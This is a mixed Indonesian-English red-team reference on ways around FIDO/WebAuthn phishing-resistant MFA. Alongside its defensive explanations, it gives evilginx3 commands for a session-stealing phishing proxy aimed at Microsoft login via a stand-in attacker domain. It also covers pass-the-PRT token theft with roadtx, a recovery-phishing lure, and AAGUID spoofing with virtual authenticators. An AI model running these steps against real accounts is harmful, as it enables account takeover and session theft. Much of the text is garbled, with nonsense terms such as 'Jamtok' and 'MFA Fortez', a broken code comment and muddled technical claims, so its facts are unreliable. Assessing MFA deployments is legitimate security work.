# MFA Phishing-Resistant: FIDO/WebAuthn Technical Reference

## 1. Mekanisme Resistance

### 1.1 Origin Binding (RP ID + Origin Check)

WebAuthn signs the assertion with `rp.id` (e.g., `gitlab.com`). The browser validates that the requested `origin` matches `rp.id`. The authenticator *never* receives an origin from outside the browser path — there is no "prompt" that can be spoofed via a third-party page.

```
Colokan kuno (phishable):
  User → password → OTP → attacker relays OTP
  OTP = data yang bisa diketik ulang di sesi lain

FIDO:
  User → password → client-side key di authenticator
  Challenge dibungkus {origin, rp.id, challenge} → ditandatangani
  Assertion hanya valid untuk origin tersebut
```

### 1.2 Channel Binding

FIDO2 credentials sign the full origin (`https://login.target.com`), not just the hostname. An attacker reverse proxy (e.g., `login.target.com.attacker.dev`) produces a different `origin` → invalid challenge → the browser rejects before reaching the authenticator.

### 1.3 Key never leaves the device

The private key is never sent in any form. Only the public key is registered at the IdP. There is no "secret" that can be relayed or keylogged. This is what makes OTP, push approval, and magic link *phishable by design* — no matter how secret, their value can be moved to the attacker's session.

### 1.4 Class Kredensial (Windows 11 24H2, Chrome 131, iOS 18)

| Class | Private Key | Transferable | Resistance |
|---|---|---|---|
| OTP (TOTP/HOTP) | shared secret | ya, keduanya punya | phishable |
| Push (Duo, MS Authenticator) | not applicable (prompt) | n/a, user decision | phishable + fatigue |
| SMS | token on the telco side | yes | most phishable |
| Platform Authenticator (TPM/Secure Enclave, Windows Hello, FaceID) | never leaves | no | phishing-resistant |
| Roaming (YubiKey 5 NFC, YubiKey Bio) | in the key's secure element | no | phishing-resistant |
| Passkey sync (iCloud/Google Password Manager) | synced to cloud + shadow key | yes, but intentional | resistant (see §3.4) |

## 2. Attack Classes That Still Work

### 2.1 AitM (Adversary-in-the-Middle) — but not against FIDO, against the session afterward

**What is sent:** reverse proxy to the target
```bash
# evilginx3 (Go, v3.3.0+), terhadap login.microsoft.com
sudo ./evilginx3 -p ./phishlets
> config domain sso.attacker.dev
> config ip 203.0.113.10
> phishlet get-hosts oauth  # regenerate CNAME records
> lures create oauth
> lures enable 0
```

**What appears:** the victim visits `https://login.microsoftonline.com.sso.attacker.dev` with a valid Let's Encrypt cert, evilginx3 relays traffic in both directions. The session cookie (`ESTSAUTH`, ` SignInState` cookie for Entra ID) is **forwarded** by the victim's browser *through* the attacker's proxy, not stolen — the attacker sees it in transit because the phishlet script extracts the Cookie header.

**Why it works:** AitM does not defeat WebAuthn. It defeats **password + session cookie**. If the org deploys WebAuthn as *second factor only* (password as primary), the attacker just harvests the session cookie after password + FIDO complete — the post-auth session is not bound to the WebAuthn challenge.

**Why it fails:** if passwordless (WebAuthn as primary, password disabled) *and* the org uses Conditional Access with device binding/CAE, there is no value that can be relayed.

### 2.2 Token Theft (post-auth)

WebAuthn protects *authentication*. The session *token* afterward remains an ordinary cookie/bearer token.

| Token | Tool | Target |
|---|---|---|
| Cookie session browser | evilginx3, Muraena | Microsoft Entra ID, Okta, Google Workspace |
| OAuth/Azure AD refresh token | `roadtx` v0.6+ | Entra ID primary refresh token (PRT) |
| Device code flow | `generate token` phishing | tenant with device code flow allowed |
| PRT (Primary Refresh Token) | `Pass-the-PRT` via `roadtx browserprtauth`, `AADInternals` | Entra ID-joined devices |

**Concrete PRT example:**
```powershell
# roadtools: pass-the-PRT — masang REQUIRES PRT yang dibedakan dari
Get-CimInstance -Namespace root/Microsoft/Windows/DeviceAccount -ClassName DeviceContextUser
roadtx browserprtauth -prt <cookie> -prt-cookie ...
# Setelah itu, minta refresh token untuk semua resource yang device boleh akses
```

**Why it works:** PRT is proof-of-possession for the device, not for the user's FIDO key. With SYSTEM or local admin on Windows 11 24H2, the PRT can be moved (DPAPI-protected in the registry, full tooling exists).

### 2.3 Session Hijack via mal-post-auth (XSS, browser hook)

C2 such as **Evilginx** multiplayer or **CactusTunnel** anchors the victim's active browser — regardless of the prior login method. WebAuthn does not provide continuous authentication (except with the reauth challenge/CAE concept).

### 2.4 Fallback/Self-Account-Recovery (most productive)

Many orgs back up WebAuthn with phishable recovery:
- Recovery email + OTP
- Help desk "identity verification" social engineering
- Temporary Access Pass (TAP) in Entra ID → if admin enables it and the workflow is phishable, attacker requests TAP via helpdesk

**Concrete payload:** phishing email "Your security key is being deprecated — verify recovery methods": link to an AitM subdomain. The victim can complete the recovery flow *without* a security key — once successful, the attacker enrolls their own yubikey. This is a workflow vulnerability, not a protocol one.

### 2.5 Attestation Forgery / registration abuse

If the IdP enforces policies (e.g., "require AAGUID `0ac8d2f5-...(YubiKey 5)`") but **does not verify the attestation chain** during *unenrollment/re-enrollment* — the attacker enrolls a software authenticator (virtual authenticator via Chrome 131 DevTools, or `pamu-fakekeys`) that masquerades as a valid AAGUID, bypassing the policy check.

```javascript
// Chrome DevTools: WebAuthn tab, enable virtual authenticator
// Transport: USB, Protocol: CTAP2, set AAGUID, resident key: yes
```

## 3. Operational Pitfalls

| Pitfall | Field Impact |
|---|---|
| **Sophisticated AitM still wins without passwordless** | If the org still uses password + FIDO as a second factor, the evilginx session cookie is still valid. Present to the client: "MFA phishing-resistant" without disabling password = your red team only needs one victim who logs in via the proxy. |
| **Password manager auto-fill** | Chrome 131 with automatic autofill can *bypass* the victim's awareness — the password is entered without them realizing they are on a phishing domain (similar reversed proxy). Combined with a virtual authenticator (2.5), it achieves a full bypass. |
| **Help desk social engineering / TAP** | Red teams focus too much on Crypto — do not forget to pentest the helpdesk phone to request a TAP or MFA reset. This is often *the only* path that works in orgs with strict FIDO. |
| **Conditional Access incomplete coverage** | A CA policy that only enforces MFA Fortez at interactive login — the attacker chooses a non-interactive flow (device code, ROPC, legacy auth) that *skips* WebAuthn entirely. `MFASweeper`, `MSOLSpray` can detect which endpoints do not enforce. |
| **Attestation *requirement*** | If the blue team says "FIDO = unhackable", show the common bug: Rp verifies AAGUID at *registration* but not before re-login; old users already enrolled with a phishable method can still *bypass* to a fallback method if the FIDO device is absent. (`selected_kebab` drop-down: "Sign-in another way" → OTP fallback). |
| **Synced passkeys (iCloud Keychain)** | `shadow key` — passkey sync can be accessed from the victim device if the attacker has Apple ID credential (password + code). Sync makes passkeys more widely distributed → target calendar file phish. Test case: phish Apple ID credential → passkey for victim SSO also accessible. |
| **Non-equal security on remote devices** | Windows Hello for Business (WHfB) v3 on Windows 11 24H2 = keyTrust TAP, cannot be verified without domain attest. Many orgs still use WHfB v1 (= certificate-based, can be done *over SMB/kerberos* → pass-the-key if the attacker has SYSTEM on the target device). |
| **Jamtok random challenge nonce** | Some IdPs cache the register challenge — replay within a few seconds is sometimes still `accepted`. Don't forget to re-test the race window between challenge signing and assertion acceptance. |

**Takeaway for scope assessment:** FIDO/WebAuthn closes the *credential phishing* window. The assessment team must verify: (a) whether passwords are truly disabled, (b) whether all non-interactive flows are closed, (c) recovery/fallback mechanisms, (d) whether session continuity (CAE/token binding) is active. If even one of the four is not — AitM/token theft techniques still make sense to run.
